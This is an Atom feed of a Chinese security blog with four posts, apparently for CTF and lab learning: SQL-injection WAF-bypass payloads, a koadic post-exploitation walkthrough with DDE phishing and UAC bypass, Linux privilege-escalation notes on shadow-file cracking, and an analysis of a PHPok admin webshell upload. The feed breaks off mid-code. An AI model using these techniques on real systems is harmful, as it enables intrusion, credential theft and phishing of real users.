<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ha1g0的窝</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://whc.dropsec.xyz/"/>
  <updated>2017-12-01T13:47:43.890Z</updated>
  <id>http://whc.dropsec.xyz/</id>
  
  <author>
    <name>Ha1g0</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SQL注入进阶</title>
    <link href="http://whc.dropsec.xyz/2017/12/01/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6%E6%80%9D%E8%80%83/"/>
    <id>http://whc.dropsec.xyz/2017/12/01/SQL注入进阶思考/</id>
    <published>2017-12-01T07:29:22.000Z</published>
    <updated>2017-12-01T13:47:43.890Z</updated>
    
    <content type="html"><![CDATA[<p>在最近CTF学习过程中，特别是sql注入（mysql）的学习中，碰到过很多坎（“waf”）,CTF的waf不是特别的强大，比如说在联合注入中不会变态到把你的select给过滤掉，但是会过滤一些关键词。在报错注入中即使把你常用的报错函数给过滤掉了，也会留给你一线生机，就比如上次LCTF的entrance.php，过滤了information_shcema，columns，tables，database()等等，题目本意是让你把当前表下的某个字段最后一条内容给dump出来。具体的题目writeup可以看chamd5微信公众号的wp还有chebeta师傅的博客。<br>现在我把我最近学习关于sql注入的姿势分享出来，有可能不适合实战环境，大佬看了请轻喷。<br><a id="more"></a></p><h2 id="不常见函数绕过waf"><a href="#不常见函数绕过waf" class="headerlink" title="不常见函数绕过waf"></a>不常见函数绕过waf</h2><p>有时候在CTF中，出题者的waf不会把waf写死，可以多fuzz几个函数。<br>比如下面的这些函数，这些函数均为MySQL中的空间数据类型的函数，要求几何字段非空。</p><ul><li>SQL空间计算函数</li></ul><p>| ————- |:————-:|<br>|   环    | geometrycollection() |<br>|  多点    |  multipoint() |<br>|  面      |  polygon()    |<br>|  多面     |  multipolygon() |<br>|  线   |   linestring()|<br>|  多线  | multilinestring()|</p><p>我经常用的就是直接用这些函数爆出当前字段所在的库和表。</p><p><img src="http://112.74.59.223/image/sql_injection/Image8.png" alt=""></p><p>之前拜读了安云luan师傅一篇文章，发现用法不仅仅只有爆当前而已，还可以跟普通的注入一样，换payload来爆出想要的信息，但是有限制，在Mysql5.5的版本下可以，在之前和之后的版本都不可以</p><p><img src="http://112.74.59.223/image/sql_injection/Image9.png" alt=""></p><ul><li>Mysql低版本</li></ul><p>NAME_CONST()</p><p><img src="http://112.74.59.223/image/sql_injection/Image14.png" alt=""></p><ul><li>Mysql5.7新特性</li></ul><p>Mysql在5.7版本引入几个新函数，可用作报错注入</p><p><img src="http://112.74.59.223/image/sql_injection/Image10.png" alt=""></p><h2 id="别名构造（过滤当前表字段数据库名关键字）"><a href="#别名构造（过滤当前表字段数据库名关键字）" class="headerlink" title="别名构造（过滤当前表字段数据库名关键字）"></a>别名构造（过滤当前表字段数据库名关键字）</h2><p>这个在上次LCTF就碰到了，当时注到库名表名和字段名了，但是用获取最后一个字段名下的值时显示该值被过滤了，然后想到就用这个方法，利用<strong>别名构造</strong>的方法</p><p>select <em> from (select 1)a,(select 2)b,(select 3)c union select </em> from users;<br><img src="http://112.74.59.223/image/sql_injection/Image11.png" alt=""></p><p>select (select d.3 from (select <em> from (select 1)a,(select 2)b,(select 3)c union select </em> from users)d limit 1,1)e,(select 1)f,(select 1)g;</p><p><img src="http://112.74.59.223/image/sql_injection/Image12.png" alt=""></p><h2 id="join报错"><a href="#join报错" class="headerlink" title="join报错"></a>join报错</h2><p>相信CTF赛棍们对这个报错注入应该都很熟悉了，不做累述。</p><p><img src="http://112.74.59.223/image/sql_injection/Image15.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在最近CTF学习过程中，特别是sql注入（mysql）的学习中，碰到过很多坎（“waf”）,CTF的waf不是特别的强大，比如说在联合注入中不会变态到把你的select给过滤掉，但是会过滤一些关键词。在报错注入中即使把你常用的报错函数给过滤掉了，也会留给你一线生机，就比如上次LCTF的entrance.php，过滤了information_shcema，columns，tables，database()等等，题目本意是让你把当前表下的某个字段最后一条内容给dump出来。具体的题目writeup可以看chamd5微信公众号的wp还有chebeta师傅的博客。&lt;br&gt;现在我把我最近学习关于sql注入的姿势分享出来，有可能不适合实战环境，大佬看了请轻喷。&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://whc.dropsec.xyz/categories/CTF/"/>
    
    
      <category term="SQL注入" scheme="http://whc.dropsec.xyz/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>关于后渗透利器koadic的一些思考</title>
    <link href="http://whc.dropsec.xyz/2017/11/23/%E5%85%B3%E4%BA%8E%E5%90%8E%E6%B8%97%E9%80%8F%E5%88%A9%E5%99%A8koadic%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"/>
    <id>http://whc.dropsec.xyz/2017/11/23/关于后渗透利器koadic的一些思考/</id>
    <published>2017-11-23T08:21:34.000Z</published>
    <updated>2017-12-01T13:41:34.978Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文章起因"><a href="#文章起因" class="headerlink" title="文章起因"></a>文章起因</h2><p>作为一个最近在学习js远控的萌新，在学习beef过程中碰到了许多问题，然后就请教在做ctf认识的小伙伴，小伙伴推荐了“大宝剑”koadic，在接触koadic之后，发现这东西真是一个对萌新特别友好的神器。本着分享即学习的原则，我就把我最近玩koadic的新的想法写成一篇文章，如果文章有任何不准确的地方，请各位大佬斧正。<br><a id="more"></a></p><h2 id="Koadic的基础用法"><a href="#Koadic的基础用法" class="headerlink" title="Koadic的基础用法"></a>Koadic的基础用法</h2><p>前期准备</p><pre><code># git clone https://github.com/zerosum0x0/koadic.git# cd koadic# pip install -r requirements.txt</code></pre><p>准备完成之后，基本的操作在参考文章的第一篇已经有所介绍，我就不再累述。koadic根据作者在github上的介绍，主要分为这么2个模块  </p><ul><li><strong>Stagers</strong>  </li></ul><table><thead><tr><th>Module</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td>stager/js/mshta</td><td style="text-align:center">serves payloads in memory using MSHTA.exe HTML Applications</td></tr><tr><td>stager/js/regsvr</td><td style="text-align:center">serves payloads in memory using regsvr32.exe COM+ scriptlets</td></tr><tr><td>stager/js/rundll32_js</td><td style="text-align:center">serves payloads in memory using rundll32.exe</td></tr><tr><td>stager/js/disk</td><td style="text-align:center">serves payloads using files on disk</td></tr></tbody></table><p>stagers是在你攻击机上生成的payload的种类</p><ul><li><strong>Implants</strong></li></ul><table><thead><tr><th>Module</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td>implant/elevate/bypassuac_eventvwr</td><td style="text-align:center">Uses enigma0x3’s eventvwr.exe exploit to bypass UAC on Windows 7, 8, and 10.</td></tr><tr><td>implant/elevate/bypassuac_sdclt</td><td style="text-align:center">Uses enigma0x3’s sdclt.exe exploit to bypass UAC on Windows 10.</td></tr><tr><td>implant/fun/zombie</td><td style="text-align:center">Maxes volume and opens The Cranberries YouTube in a hidden window.</td></tr><tr><td>implant/fun/voice</td><td style="text-align:center">Plays a message over text-to-speech.</td></tr><tr><td>implant/gather/clipboard</td><td style="text-align:center">Plays a message over text-to-speech.</td></tr><tr><td>implant/gather/hashdump_sam</td><td style="text-align:center">Retrieves hashed passwords from the SAM hive.</td></tr><tr><td>implant/gather/hashdump_dc</td><td style="text-align:center">Domain controller hashes from the NTDS.dit file.</td></tr><tr><td>implant/inject/mimikatz_dotnet2js</td><td style="text-align:center">Injects a reflective-loaded DLL to run powerkatz.dll (@tirannido DotNetToJS).</td></tr><tr><td>implant/inject/shellcode_excel</td><td style="text-align:center">Runs arbitrary shellcode payload (if Excel is installed).</td></tr><tr><td>implant/manage/enable_rdesktop</td><td style="text-align:center">Enables remote desktop on the target.</td></tr><tr><td>implant/manage/exec_cmd</td><td style="text-align:center">Run an arbitrary command on the target, and optionally receive the output.</td></tr><tr><td>implant/pivot/stage_wmi</td><td style="text-align:center">Hook a zombie on another machine using WMI.</td></tr><tr><td>implant/pivot/exec_psexec</td><td style="text-align:center">Run a command on another machine using psexec from sysinternals.</td></tr><tr><td>implant/scan/tcp</td><td style="text-align:center">Uses HTTP to scan open TCP ports on the target zombie LAN.</td></tr><tr><td>implant/utils/download_file</td><td style="text-align:center">Downloads a file from the target zombie.</td></tr><tr><td>implant/utils/upload_file</td><td style="text-align:center">Uploads a file from the listening server to the target zombies.</td></tr></tbody></table><p>implant是在koadic能执行的操作，想命令执行exec_cmd，上传下载文件download_file，upload_file，抓hash  hashdump_sam和hashdump_dc等等。</p><p>但是有几点补充：<br>我在本机测试的时候<br>1.用python2运行，会出现UnicodeDecodeError：ascii的错误，第一篇文章里面有了<a href="http://blog.csdn.net/qq_20125305/article/details/44562901" target="_blank" rel="external">解决方案</a><br>2.在更新过微软的补丁，bypassuac_eventvwr 和/bypassuac_sdclt win10提权均不成功，所以抓hash的一些操作不了。<br>3.在implant/fun 模块下 voice操作全部成功，但是cranberry出现AttributeError: ‘ThunderstruckImplant’ object has no attribute ‘load_script’错误，跟了一遍代码，发现不了问题，而且github上面也没有issue，很苦恼，各位大佬看出问题，可以联系小弟。</p><h2 id="结合office的DDE命令执行来钓鱼"><a href="#结合office的DDE命令执行来钓鱼" class="headerlink" title="结合office的DDE命令执行来钓鱼"></a>结合office的DDE命令执行来钓鱼</h2><p>实验环境：<br>攻击机  kali（192.168.189.137）<br>靶机    win7家庭版 （192.168.189.139）</p><p>参考第二篇参考文章，利用dde做一个带有恶意命令的word</p><p><img src="http://oohnuejim.bkt.clouddn.com/dde.png" alt=""></p><p>诱导靶机用户点击这个word，并且允许进行外部链接引用，当用户点击点击链接，我们攻击已经生成了一个session</p><p><img src="http://oohnuejim.bkt.clouddn.com/%E5%8F%8D%E5%BC%B92.png" alt=""></p><p>我们可以使用 bypassuac_evenvwr提权，提完权可以进行其他骚骚的操作<br><img src="http://oohnuejim.bkt.clouddn.com/%E6%8F%90%E6%9D%83.png" alt=""></p><p>扫描tcp端口<br><img src="http://oohnuejim.bkt.clouddn.com/tcp%E6%89%AB%E6%8F%8F.png" alt=""><br>也可以进行内网扫描（偷了个懒，扫了kaili，kali是扫不到的）<br><img src="http://oohnuejim.bkt.clouddn.com/tcp%E6%89%AB%E6%8F%8F2.png" alt=""></p><p>也可以上传文件（这个我在win10上成功了，win7上没成功）<br><img src="http://oohnuejim.bkt.clouddn.com/%E4%B8%8A%E4%BC%A02.png" alt=""><br><img src="http://oohnuejim.bkt.clouddn.com/%E4%B8%8A%E4%BC%A0.png" alt=""></p><p>功能还是挺强大的</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://www.freebuf.com/sectool/145674.html" target="_blank" rel="external">http://www.freebuf.com/sectool/145674.html</a><br><a href="http://www.freebuf.com/articles/terminal/150285.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/150285.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;文章起因&quot;&gt;&lt;a href=&quot;#文章起因&quot; class=&quot;headerlink&quot; title=&quot;文章起因&quot;&gt;&lt;/a&gt;文章起因&lt;/h2&gt;&lt;p&gt;作为一个最近在学习js远控的萌新，在学习beef过程中碰到了许多问题，然后就请教在做ctf认识的小伙伴，小伙伴推荐了“大宝剑”koadic，在接触koadic之后，发现这东西真是一个对萌新特别友好的神器。本着分享即学习的原则，我就把我最近玩koadic的新的想法写成一篇文章，如果文章有任何不准确的地方，请各位大佬斧正。&lt;br&gt;
    
    </summary>
    
    
      <category term="渗透" scheme="http://whc.dropsec.xyz/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>关于Liunx提权的思考</title>
    <link href="http://whc.dropsec.xyz/2017/08/10/%E5%85%B3%E4%BA%8ELinux%E6%8F%90%E6%9D%83%E7%9A%84%E6%80%9D%E8%80%83/"/>
    <id>http://whc.dropsec.xyz/2017/08/10/关于Linux提权的思考/</id>
    <published>2017-08-10T11:57:49.000Z</published>
    <updated>2017-11-20T12:03:34.583Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://www.freebuf.com/articles/system/129549.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/129549.html</a></p><p>2个思路，一个是直接用提权的exp，一种是看看shadow文件可不可读，可读就直接爆破</p><p>提权exp整理<br><a href="http://exploit.linuxnote.org/" target="_blank" rel="external">http://exploit.linuxnote.org/</a><br><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="external">https://github.com/SecWiki/linux-kernel-exploits</a></p><a id="more"></a><h3 id="一、提权"><a href="#一、提权" class="headerlink" title="一、提权"></a>一、提权</h3><p>两个在靶机本地运行的脚步</p><ul><li>LinEnum</li></ul><p>git clone <a href="https://github.com/rebootuser/LinEnum.git" target="_blank" rel="external">https://github.com/rebootuser/LinEnum.git</a></p><p>直接运行sh脚本就行了， ./LinEnum.sh</p><ul><li>Linux Exploit Suggester</li></ul><p>注意是perl写的，所以需要有环境</p><p>git clone <a href="https://github.com/PenturaLabs/Linux_Exploit_Suggester.git" target="_blank" rel="external">https://github.com/PenturaLabs/Linux_Exploit_Suggester.git</a></p><p>攻击机kali</p><ul><li>exp-db</li></ul><p>searchsploit </p><h3 id="二、明文root密码提权"><a href="#二、明文root密码提权" class="headerlink" title="二、明文root密码提权"></a>二、明文root密码提权</h3><p>遇到的概率很小</p><p>大多linux系统的密码都和/etc/passwd和/etc/shadow这两个配置文件息息相关。passwd里面储存了用户，shadow里面是密码的hash。出于安全考虑passwd是全用户可读，root可写的。shadow是仅root可读写的。</p><p>这里是一个典型的passwd文件</p><pre><code>root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:usr/sbin:/bin/shbin:x:2:2:bin:/bin:/binshsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:bin/syncgames:x:5:60:games:/usr/games:/binshman:x:6:12:man:/var/cache/man:/bin/shlp:x:7:7:lp:var/spool/lpd:/bin/shmail:x:8:8:mail:/var/mail:/binshnews:x:9:9:news:/var/spool/news:/binshuucp:x:10:10:uucp:/var/spool/uucp:/binshproxy:x:13:13:proxy:/bin:/bin/shwww-data:x:33:33:www-data:/var/www:/binshbackup:x:34:34:backup:/var/backups:/binshlist:x:38:38:Mailing List Manager:/var/list:/bin/shirc:x:39:39:ircd:/var/run/ircd:/binshnobody:x:65534:65534:nobody:/nonexistent:/binshibuuid:x:100:101::/var/lib/libuuid:/bin/shsyslog:x:101:103::/home/syslog:/binfalsesshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin</code></pre><p>passwd由冒号分割，第一列是用户名，第二列是密码，x代表密码hash被放在shadow里面了（这样非root就看不到了）。而shadow里面最重要的就是密码的hash</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;http://www.freebuf.com/articles/system/129549.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.freebuf.com/articles/system/129549.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2个思路，一个是直接用提权的exp，一种是看看shadow文件可不可读，可读就直接爆破&lt;/p&gt;
&lt;p&gt;提权exp整理&lt;br&gt;&lt;a href=&quot;http://exploit.linuxnote.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://exploit.linuxnote.org/&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://github.com/SecWiki/linux-kernel-exploits&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/SecWiki/linux-kernel-exploits&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="工具" scheme="http://whc.dropsec.xyz/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>PHPok后台getshell分析</title>
    <link href="http://whc.dropsec.xyz/2017/07/31/PHPok%E5%90%8E%E5%8F%B0getshell%E5%88%86%E6%9E%90/"/>
    <id>http://whc.dropsec.xyz/2017/07/31/PHPok后台getshell分析/</id>
    <published>2017-07-31T03:14:40.000Z</published>
    <updated>2017-07-31T03:29:54.233Z</updated>
    
    <content type="html"><![CDATA[<p>这个是夏令营师傅现场审计的一个0day，但是感觉这个cms很小众，直接利用这个漏洞的话会感觉很鸡肋，毕竟先要进后台。但是getshell的思路很nice。<br><a id="more"></a></p><h2 id="漏洞利用-："><a href="#漏洞利用-：" class="headerlink" title="漏洞利用 ："></a>漏洞利用 ：</h2><ul><li>方法一：</li></ul><p>以admin账户登入后台（admin密码怎么来，方法很多，如sql注入等），在程序升级模块压缩包上传处上传一个webshell压缩包</p><p><img src="https://ws1.sinaimg.cn/large/00699yRSly1fi2whv2j9uj30sk0jqtaw.jpg" alt=""></p><p>直接访问根目录webshell文件就行了</p><p><img src="https://ws1.sinaimg.cn/large/00699yRSly1fi2wi97jkbj31gw0hxwgf.jpg" alt=""></p><ul><li>方法二：</li></ul><p>条件竞争型的发升级包，和请求data/update/目录下被解包的php，这个php要能够在北执行的时候生成一个新的php文件，也就是我们的shell。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在以管理员身份登上后台后，以一个渗透测试者的角度来看，要想拿到服务器的shell，肯定得找上传的地方，要么你在什么地方放个存储型xss，盗个管理员cookie啥的，说不定就有一些服务器信息什么的。在后台找到一个上传插件的地方，在上传的抓包分析下，可以从url看到是这个是通过url参数来调用功能的cms，上传的内容是一句话和phpinfo()</p><p><img src="https://ws1.sinaimg.cn/large/00699yRSly1fi2wkl2oboj30xp0o1whf.jpg" alt=""></p><p>查看源码，从admin.php开始查看代码流程，admin.php定义了一堆宏，主要是框架在framework/admin中定义，转到该目录下，一下子就看见update_control.php。既然上传的是zip，肯定会有压缩包的解压，要想getshell，就要找到你zip解包过后文件的位置和文件名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//解压zip</span></div><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unzip_f</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    $zipfile = <span class="keyword">$this</span>-&gt;get(<span class="string">'zipfile'</span>);</div><div class="line">    <span class="keyword">if</span>(!$zipfile)&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;error(P_Lang(<span class="string">'未指定附件文件'</span>));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(strpos($zipfile,<span class="string">'..'</span>) !== <span class="keyword">false</span>)&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;error(P_Lang(<span class="string">'不支持带..上级路径'</span>));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(!file_exists(<span class="keyword">$this</span>-&gt;dir_root.$zipfile))&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;error(P_Lang(<span class="string">'ZIP文件不存在'</span>));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">$this</span>-&gt;lib(<span class="string">'phpzip'</span>)-&gt;unzip(<span class="keyword">$this</span>-&gt;dir_root.$zipfile,<span class="string">'data/update/'</span>);<span class="comment">//把zip解压到data/update/目录下</span></div><div class="line">    $info = <span class="keyword">$this</span>-&gt;update_load();<span class="comment">//根据包升级</span></div><div class="line">    <span class="keyword">if</span>(!$info || (is_array($info) &amp;&amp; $info[<span class="string">'status'</span>] == <span class="string">'error'</span>))&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;error($info[<span class="string">'content'</span>]);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">$this</span>-&gt;success();</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>可以看到对压缩包进行解包，解包后把文件放在网站根目录的data/update/目录下，然后进行包的升级，到这里，应该可以算找到上传的路径了把，尝试一下，看看你能不能访问到，他返回的是一个cache地址，访问不到，应该是删除了。</p><p>文件升级其实跟上面zip升级差不太多<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//文件升级</span></div><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_f</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    $file = <span class="keyword">$this</span>-&gt;get(<span class="string">'file'</span>,<span class="string">'int'</span>);</div><div class="line">    <span class="keyword">if</span>(!$file)&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;json(P_Lang(<span class="string">'升级失败，未指定文件'</span>));</div><div class="line">    &#125;</div><div class="line">    $urlext = <span class="string">'file='</span>.rawurlencode($file);</div><div class="line">    $rs = <span class="keyword">$this</span>-&gt;service(<span class="number">5</span>,$urlext);</div><div class="line">    $rs = <span class="keyword">$this</span>-&gt;lib(<span class="string">'json'</span>)-&gt;decode($rs);</div><div class="line">    <span class="keyword">if</span>($rs[<span class="string">'status'</span>] != <span class="string">'ok'</span>)&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;json($rs[<span class="string">'content'</span>]);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(!$rs[<span class="string">'content'</span>])&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;json(P_Lang(<span class="string">'升级失败，升级包内容为空'</span>));</div><div class="line">    &#125;</div><div class="line">    $info = base64_decode($rs[<span class="string">'content'</span>]);</div><div class="line">    file_put_contents(<span class="keyword">$this</span>-&gt;dir_root.<span class="string">'data/tmp.zip'</span>,$info);</div><div class="line">    <span class="keyword">$this</span>-&gt;lib(<span class="string">'phpzip'</span>)-&gt;unzip(<span class="keyword">$this</span>-&gt;dir_root.<span class="string">'data/tmp.zip'</span>,<span class="string">'data/update/'</span>); <span class="comment">//把tmp.zip解压到update目录底下</span></div><div class="line">    <span class="keyword">$this</span>-&gt;lib(<span class="string">'file'</span>)-&gt;rm(<span class="keyword">$this</span>-&gt;dir_root.<span class="string">'data/tmp.zip'</span>);</div><div class="line">    $verinfo = substr($file,<span class="number">0</span>,<span class="number">1</span>).<span class="string">"."</span>.substr($file,<span class="number">1</span>,<span class="number">1</span>).<span class="string">"."</span>.substr($file,<span class="number">2</span>);</div><div class="line">    $info = <span class="keyword">$this</span>-&gt;update_load($verinfo);</div><div class="line">    <span class="keyword">if</span>(!$info || (is_array($info) &amp;&amp; $info[<span class="string">'status'</span>] == <span class="string">'error'</span>))&#123;</div><div class="line">        <span class="keyword">if</span>(!$info[<span class="string">'content'</span>]) $info[<span class="string">'content'</span>] = <span class="string">'升级失败'</span>;</div><div class="line">        <span class="keyword">$this</span>-&gt;json($info[<span class="string">'content'</span>]);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">$this</span>-&gt;json(<span class="string">'ok'</span>,<span class="keyword">true</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>跟进update_load()函数里看看这个函数实现的功能</p><ol><li><p>把data/update目录底下的文件放入list的数组  </p></li><li><p>比对升级升级信息<br>如果为delete.txt、run.php、framework/等等进行其他操作<br>如果不存在tmp.zip就把zip内的文件在根目录生成</p></li><li><p>更新sql                  </p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//升级文件</span></div><div class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">update_load</span><span class="params">($verinfo=<span class="string">''</span>)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        $list = <span class="keyword">array</span>(); <span class="comment">//升级文件内容列表</span></div><div class="line">        <span class="keyword">$this</span>-&gt;lib(<span class="string">'file'</span>)-&gt;deep_ls(<span class="keyword">$this</span>-&gt;dir_root.<span class="string">'data/update/'</span>,$list);</div><div class="line">        <span class="keyword">if</span>(!$list || count($list) &lt; <span class="number">1</span>)&#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'status'</span>=&gt;<span class="string">'error'</span>,<span class="string">'content'</span>=&gt;P_Lang(<span class="string">'没有升级文件内容'</span>));</div><div class="line">        &#125;</div><div class="line">        $strlen = strlen(<span class="keyword">$this</span>-&gt;dir_root.<span class="string">"data/update/"</span>);</div><div class="line">        $delfile = <span class="keyword">false</span>;</div><div class="line">        $sqlfile = <span class="keyword">array</span>();</div><div class="line">        $cfile = <span class="keyword">array</span>();</div><div class="line">        <span class="keyword">foreach</span>($list <span class="keyword">AS</span> $key=&gt;$value)&#123;</div><div class="line">            $value = trim($value);</div><div class="line">            <span class="keyword">if</span>(!$value)&#123;</div><div class="line">                <span class="keyword">continue</span>;</div><div class="line">            &#125;</div><div class="line">            $tmp = substr($value,$strlen);</div><div class="line">            <span class="keyword">if</span>($tmp == <span class="string">'version.txt'</span>)&#123;</div><div class="line">                $verinfo = trim(file_get_contents($value));</div><div class="line">                <span class="keyword">continue</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span>($tmp == <span class="string">'delete.txt'</span>)&#123;</div><div class="line">                $delfile = $value;</div><div class="line">                <span class="keyword">continue</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span>($tmp == <span class="string">'run.php'</span>)&#123;</div><div class="line">                <span class="keyword">continue</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span>(substr($tmp,<span class="number">-3</span>) == <span class="string">'sql'</span> &amp;&amp; $tmp != <span class="string">'table.sql'</span>)&#123;</div><div class="line">                $sqlfile[] = $value;</div><div class="line">                <span class="keyword">continue</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span>(substr($tmp,<span class="number">0</span>,<span class="number">17</span>) == <span class="string">'framework/config/'</span>)&#123;</div><div class="line">                $cfile[] = $value;</div><div class="line">                <span class="keyword">continue</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span>(substr($tmp,<span class="number">0</span>,<span class="number">10</span>) == <span class="string">'framework/'</span>)&#123;</div><div class="line">                $tmp1 = substr($tmp,<span class="number">10</span>);</div><div class="line">                <span class="keyword">if</span>(is_file($value))&#123;</div><div class="line">                    <span class="keyword">$this</span>-&gt;lib(<span class="string">'file'</span>)-&gt;mv($value,<span class="keyword">$this</span>-&gt;dir_phpok.$tmp1);</div><div class="line">                    <span class="keyword">continue</span>;</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">if</span>(is_dir($value) &amp;&amp; !is_dir(<span class="keyword">$this</span>-&gt;dir_phpok.$tmp1))&#123;</div><div class="line">                    <span class="keyword">$this</span>-&gt;lib(<span class="string">'file'</span>)-&gt;make(<span class="keyword">$this</span>-&gt;dir_phpok.$tmp1,<span class="string">'folder'</span>);</div><div class="line">                    <span class="keyword">continue</span>;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span>(is_file($value) &amp;&amp; $tmp != <span class="string">'table.sql'</span>)&#123;</div><div class="line">                <span 